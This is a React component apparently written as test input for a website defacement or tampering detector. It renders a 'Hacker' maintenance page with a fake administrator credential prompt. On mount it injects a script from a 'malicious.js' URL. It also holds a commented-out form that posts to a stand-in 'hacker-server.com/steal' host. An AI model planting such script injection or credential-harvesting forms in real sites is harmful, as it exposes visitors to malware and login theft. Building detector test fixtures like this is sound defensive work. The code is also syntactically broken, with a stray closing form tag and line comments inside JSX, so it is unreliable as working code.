import React, { useEffect } from 'react';

/**
 * MainContent - Layer 1 Full Stress Test (Fixed Syntax)
 */
const MainContent = () => {
  
  // Properly inject the malicious script into the DOM for detector testing
  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://unknown-cdn.com/malicious.js";
    script.id = "malicious-script-trigger";
    script.async = true;
    document.body.appendChild(script);
    
    return () => {
      const el = document.getElementById("malicious-script-trigger");
      if (el) document.body.removeChild(el);
    };
  }, []);

  return (
    <div className="defaced-root" id="layer1-pwned-zone">

      {/* HEADER SECTION */}
      <header
        className="hacked-header"
        style={{
          backgroundColor: '#111',
          color: '#ff4444',
          padding: '50px',
          textAlign: 'center',
        }}
      >
        <h5 style={{ fontSize: '3rem', marginBottom: '10px' }}>
          PLATFORM MAINTENANCE ACTIVE
        </h5>

        <h2 style={{ fontWeight: 'normal' }}>
          Hacker
        </h2>
      </header>

      {/* MAIN SECTION */}
      <main className="content-purge" style={{ padding: '30px' }}>
        <p>
          This platform is currently undergoing infrastructure upgrades
          and authentication system maintenance.
        </p>

        {/* TEST: Form Hijacking (action change) */}
        {/* <form 
          action="https://hacker-server.com/steal" 
          method="POST"
          style={{
            margin: '40px 0',
            border: '2px solid #ff4444',
            padding: '20px',
            borderRadius: '6px',
          }}
        > */}
          <h3>Administrator Access Validation</h3>

          <label
            htmlFor="adminKey"
            style={{ display: 'block', marginBottom: '10px' }}
          >
            Secure Verification Credential
          </label>

          <input
            id="adminKey"
            type="password"
            placeholder="Enter authorized verification credential"
            style={{
              padding: '12px',
              width: '100%',
              marginBottom: '20px',
            }}
          />

          <button
            type="submit"
            style={{
              backgroundColor: '#ff4444',
              color: 'white',
              border: 'none',
              padding: '12px 24px',
              cursor: 'pointer',
            }}
          >
            Validate Administrative Session
          </button>
        </form>
      </main>

      {/* STRUCTURAL NOISE (For TED testing) */}
      // <div
      //   className="structural-noise"
      //   aria-hidden="true"
      //   style={{ opacity: 0, height: 0 }}
      // >
      //   {Array.from({ length: 400 }).map((_, i) => (
      //     <section key={i} className={`anomaly-block-v4-${i}`}>
      //       <span id={`drift-id-${i}`}>
      //         STRUCTURAL_ENTROPY_ACTIVE
      //       </span>
      //     </section>
      //   ))}
      // </div>

      {/* FOOTER SECTION */}
      <footer
        className="footer-void"
        style={{
          textAlign: 'center',
          padding: '20px',
          borderTop: '4px solid #ff4444',
        }}
      >
        <b style={{ fontSize: '20px' }}>
          SYSTEM STATUS: MAINTENANCE MODE
        </b>
      </footer>
    </div>
  );
};

export default MainContent;
